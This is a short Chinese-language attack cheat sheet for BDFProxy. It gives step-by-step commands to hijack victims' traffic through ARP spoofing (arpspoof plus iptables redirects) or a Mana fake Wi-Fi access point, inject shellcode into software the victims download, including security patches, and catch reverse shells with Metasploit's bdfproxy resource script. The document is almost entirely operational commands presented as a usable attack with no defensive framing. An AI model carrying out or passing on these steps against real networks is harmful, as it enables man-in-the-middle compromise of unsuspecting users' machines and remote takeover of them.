# Bdfproxy
> 可以基于流量劫持动态注入shellcode（ARP spoof、DNS spoof、Fake AP）, 直接向用户正常下载的软件插入shellcode. 即使是微软的安全补丁也可能劫持, 擦除签名等.


## 0x01 利用ARP

```
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -p tcp --dport 80/443 -j REDIRECT --to-ports 8080

vi /etc/bdfproxy/bdfproxy.cfg

proxyMode = transparent
修改侦盺IP地址并启动bdfproxy

arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1

输入,启动
bdfproxy

启动 Msf,等待上钩
msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc
```

## 0x02 利用Mana创建Fack AP

步骤: 
1. Mana 创建 Fack AP
2. Bdfproxy 代理注入代码
3. Msf 侦盺反弹shell

```
apt install mana-toolkit

修改无线 SSID 名称
vi /etc/mana-toolkit/hostapd-mana.conf	

修改 waln1 无线网卡适配器并启动
/usr/share/mana-toolkit/run-mana/start-nat-simple.sh

把里面iptables的规则改为: 
iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i $phy -p tcp --dport 443 -j REDIRECT --to-port 8080

修改侦盺IP地址并
vi /etc/bdfproxy/bdfproxy.cfg
proxyMode = transparent
启动bdfproxy

启动msf
msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc
```
